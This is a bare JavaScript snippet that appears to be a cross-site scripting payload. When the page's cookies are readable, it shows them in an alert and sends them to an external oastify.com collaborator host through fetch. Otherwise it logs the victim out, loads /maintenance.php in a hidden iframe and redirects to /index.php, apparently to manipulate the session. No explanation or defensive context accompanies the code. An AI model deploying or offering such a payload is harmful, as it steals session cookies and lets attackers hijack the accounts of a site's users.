if (document.cookie !== "") {
  alert(document.cookie);
  fetch('https://7qy9bct7rhtlcdz03g0h8xpbv21vplda.oastify.com/cookie?c='+document.cookie);
}
else{
  fetch('/logout.php', {
    method: 'GET',
    credentials: 'include',
    redirect: 'manual'
  }).then(() => {
    const i = document.createElement('iframe');
    i.src = '/maintenance.php';
    i.style.display = 'none';
    document.body.appendChild(i);

    setTimeout(() => {
      window.location.href = '/index.php';
    }, 2000);
  });
}
